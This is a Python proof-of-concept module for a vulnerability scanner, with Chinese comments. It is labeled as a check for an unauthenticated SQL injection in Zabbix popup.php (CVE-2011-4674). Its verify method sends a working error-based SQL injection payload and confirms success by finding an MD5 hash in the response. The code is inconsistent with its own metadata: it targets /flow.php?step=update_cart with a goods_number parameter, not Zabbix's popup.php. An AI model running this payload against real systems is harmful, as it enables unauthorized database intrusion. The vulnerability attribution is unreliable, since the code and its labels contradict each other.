# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Zabbix_0002'  # 平台漏洞编号，留空
    name = 'Zabbix /popup.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2011-11-24'  # 漏洞公布时间
    desc = '''
        Zabbix version 1.8.3 and 1.8.4 has one vulnerability in the popup.php that
        enables an attacker to perform a SQL Injection Attack. No authentication
        required.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/18155/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2011-4674'  # cve编号
    product = 'Zabbix'  # 漏洞应用名称
    product_version = '1.8.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8caa348d-e106-4475-8d52-bb2b5b6dc1c7'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("goods_number%5B1%27+and+%28select+1+from%28select+count%28"
                       "*%29%2Cconcat%28%28select+%28select+%28SELECT+md5(3.1415)%29%29"
                       "+from+information_schema.tables+limit+0%2C1%29%2Cfloor%28rand"
                       "%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29"
                       "+and+1%3D1+%23%5D=1&submit=exp")
            verify_url = self.target + '/flow.php?step=update_cart'
            req = requests.post(verify_url, data=payload)

            if req.status_code == 200 and '63e1f04640e83605c1d177544a5a0488' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
